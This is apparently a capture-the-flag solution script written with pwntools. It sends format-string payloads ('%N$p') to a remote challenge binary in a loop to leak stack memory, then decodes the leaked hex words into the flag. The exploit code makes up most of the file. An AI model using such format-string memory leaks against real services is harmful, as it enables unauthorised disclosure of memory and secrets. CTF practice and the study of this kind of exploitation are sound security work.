from pwn import *
from sys import *
import binascii

context.log_level = 'warning'
elf = ELF('readme')


HOST = 'dctf-chall-readme.westeurope.azurecontainer.io'
PORT = 7481

cmd = """
b*main
"""

if(argv[1] == 'gdb'):
	gdb.attach(p,cmd)
elif(argv[1] == 'rm'):
	p = remote(HOST,PORT)

def hack():
	for i in range(100):
		#p = process('readme')
		p = remote(HOST,PORT)
		payload = '%{}$p'.format(i)
		p.sendline(payload)
		print(p.recv(),i)
		p.close()

#hack()
'''
b"hello, what's your name?\nhello 0x77306e7b66746364\n" 8
b"hello, what's your name?\nhello 0x646133725f30675f\n" 9
b"hello, what's your name?\nhello 0x30625f656d30735f\n" 10
b"hello, what's your name?\nhello 0x7fb100356b30\n" 11
b"hello, what's your name?\nhello 0xa7024323125\n" 12
'''
a = b'77306e7b66746364'
b = b'646133725f30675f'
c = b'30625f656d30735f'
d = b'7f4900356b30'
e = b'0a7024323125'
flag = b''
flag += binascii.unhexlify(a)[::-1]
flag += binascii.unhexlify(b)[::-1]
flag += binascii.unhexlify(c)[::-1]
flag += binascii.unhexlify(d)[::-1]
flag += binascii.unhexlify(e)[::-1]
print(flag)